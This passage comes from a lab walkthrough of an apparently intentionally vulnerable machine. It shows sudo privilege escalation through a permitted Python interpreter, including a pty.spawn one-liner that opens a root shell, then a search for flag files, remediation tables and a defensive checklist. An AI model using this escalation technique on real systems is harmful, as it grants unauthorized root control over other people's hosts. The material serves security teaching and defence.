Read the second output as a sentence: "user `steven` may run `/usr/bin/python` as root". A general-purpose interpreter can execute operating-system commands — Python can import the `os` module and call anything — so a rule that permits one interpreter effectively permits every command, and this is a serious privilege boundary failure. The same reasoning condemns editors (which can execute shell commands), shells, package managers, and any program that can be pointed at a script of its own.

In a real system, remove the broad rule and replace it with a narrowly scoped administrative command or a safer service mechanism: a single allowed binary with fixed arguments, or a proper privilege-separation design. The rule should read as "may restart exactly this service", never "may run this Swiss-army knife". Public collections such as GTFOBins catalogue how hundreds of common binaries turn into shells when granted sudo — worth browsing once, so the pattern becomes recognisable.

</details>

---

## 11. Demonstrate the impact in the lab

> **Concept.** Demonstrating impact is the exploitation phase of PTES made concrete: a non-interactive proof that the interpreter now holds root (effective uid `0`) is worth more than a screenshot of a shell, because it is reproducible and leaves one audit entry. Public catalogues such as GTFOBins systematise the method by listing how hundreds of ordinary binaries hand out a shell when `sudo` is misconfigured. The same finding is closed defensively by removing the broad rule and auditing what `sudo` already logged.

Only inside the intentionally vulnerable lab, the permitted interpreter can be used to demonstrate that the rule crosses the user-to-root boundary:

```bash
sudo /usr/bin/python -c 'import os; print(os.geteuid()); print(os.getuid())'
```

**Output:**

```text
0
0
```

On Linux, effective user ID `0` is root, so the output proves that the interpreter was launched with root privileges.

<details>
<summary><strong>Read more</strong> — why the non-interactive proof comes first</summary>

`geteuid()` prints the *effective* user id — the one the kernel consults for permission checks — and `getuid()` the real one; both being `0` says the process is running as root in every sense. The `-c` flag runs the given Python code and exits, so nothing interactive is left running on the target.

This non-interactive demonstration is safer and clearer than immediately opening a full root shell because it confirms impact with minimal action: it produces one small, quotable line of evidence, touches nothing on the system, and gives you a moment to decide — and to write down — what you will do next. The same one-liner is how you would prove impact for almost any privilege-escalation finding: show the identity, not the crown jewels.

</details>

Some training environments demonstrate an interactive shell using a pseudo-terminal:

```bash
sudo /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
```

**Output:**

```text
root@raven:/home/steven#
```

The prompt ending in `#` shows that the spawned shell is running as root; `pty.spawn` hands the shell a pseudo-terminal so interactive programs behave normally. Confirm the identity explicitly:

```bash
id
```

**Output:**

```text
uid=0(root) gid=0(root) groups=0(root)
```

`pty.spawn` attaches a shell to a pseudo-terminal, improving interactive behavior, and the `id` output — uid `0`, the numeric identity of root — confirms the privilege level.

<details>
<summary><strong>Read more</strong> — the defensive response to a finding like this</summary>

A prompt ending in `#` is the quick visual clue that you are the administrator; the `id` line is the proof, because only uid `0` prints `uid=0(root)`. Interactive shells are convenient for exploring, but every extra command you run as root is another entry in the logs — in a graded exercise, the non-interactive proof from the previous step is usually the cleaner deliverable.

Do not use this technique on systems without authorization; the appropriate defensive response is to remove the unsafe `sudoers` entry and audit command execution logs. `sudo` records every invocation, including which rule allowed it, so the audit trail already exists — reviewing it is how an organization discovers that a rule like this has been quietly abused.

</details>

---

## 12. Locate and document final evidence

> **Concept.** The last phase of PTES is Reporting, and its raw material is the evidence file each earlier step produced. MITRE ATT&CK supplies a common vocabulary for the narrative — T1190 for the web foothold, T1078 for the reused account, T1552.001 for the exposed secret and T1548.003 for the `sudo` failure — so that two assessors describe the same chain the same way. A finding that names the location, the access it granted and the fix it needs is the deliverable; the flag itself is only a marker of success.

Once root access has been demonstrated in the lab, search only the challenge directories or explicitly authorized paths:

```bash
find /root /home /var/www -maxdepth 3 -type f -iname '*flag*' -print 2>/dev/null
```

**Output:**

```text
/root/flag4.txt
/home/steven/flag3.txt
/var/www/html/flag2.txt
```

The command searches for filenames containing `flag`, limits recursion to three levels, and suppresses permission errors. Read the files only as required by the exercise, then record their locations and the access path rather than publishing unnecessary secret content.

<details>
<summary><strong>Read more</strong> — from a found file to a professional finding</summary>

`-iname` matches the pattern ignoring case, so `Flag.txt` and `FLAG3.TXT` are found too, and `-print` states explicitly what would otherwise be the default action — harmless here, but the same slot accepts `-exec`, which can make one typo run a command across hundreds of files. Searching only named directories keeps both the scan and the report inside the agreed scope.

A professional finding should connect evidence to remediation. The chain from this lab maps directly onto fixes:

| Evidence collected | Remediation |
| --- | --- |
| Comment in the page source | Remove exposed comments; fix the review process that let them ship |
| WordPress and plugin versions | Keep the CMS, themes, and plugins updated |
| Plaintext database password in `wp-config.php` | Store secrets in protected configuration or a secrets manager, with restrictive file permissions |
| Password reuse between web and shell | Use unique, long passwords and multi-factor authentication where practical |
| Database superuser used for web access | Give database accounts only the privileges required by the application |
| `sudoers` rule allowing Python | Replace interpreter rules with tightly constrained commands |

</details>

---

## Defensive review checklist

> **Concept.** The controls below are the concrete face of Saltzer & Schroeder's (1975) design principles — least privilege, fail-safe defaults and complete mediation — applied to a web application and the host beneath it. No single item is sufficient: the value comes from overlapping them so that no one mistake is decisive, exactly as the CIS Benchmarks arrange their recommendations.

- Restrict laboratory targets to an isolated network and confirm authorization before scanning.
- Disable directory listings and remove comments or files that reveal secrets.
- Keep the web server, PHP runtime, CMS, themes, and plugins updated.
- Store secrets in protected configuration or a secrets manager, with restrictive file permissions.
- Use unique, long passwords and multi-factor authentication where practical.
- Give database accounts only the privileges required by the application; never use a database superuser for routine web access.
- Disable the XML-RPC endpoint (`xmlrpc.php`) when it is unused, and limit login attempts on the authentication forms.
- Rotate the WordPress authentication salts after any exposure, and set `DISALLOW_FILE_EDIT` in `wp-config.php`.
- Enforce restrictive file permissions on `wp-config.php` and other files that hold secrets.
- Review `sudoers` rules for interpreters, editors, shells, and other programs that can execute arbitrary commands.
- Log and review authentication, database, web-server, and privilege-escalation events.
- Rotate any credential that may have been exposed and preserve sanitized evidence for the incident record.

## Key takeaways

> **Concept.** A strong assessment is a chain of verified observations, read from left to right through the PTES phases and reported in the shared language of MITRE ATT&CK. The evidence file that accumulates along the way is what lets a reviewer re-run every step and reach the same conclusion, which is the difference between a walkthrough and a claim.

A strong assessment is a chain of verified observations: a port identifies a service, enumeration reveals application paths, source and configuration review expose weaknesses, database inspection explains account relationships, and `sudo -l` reveals the final privilege boundary.

At every step, save command output, explain what it proves, and distinguish confirmed facts from hypotheses. The same workflow supports both offensive learning in a sandbox and defensive remediation in production.
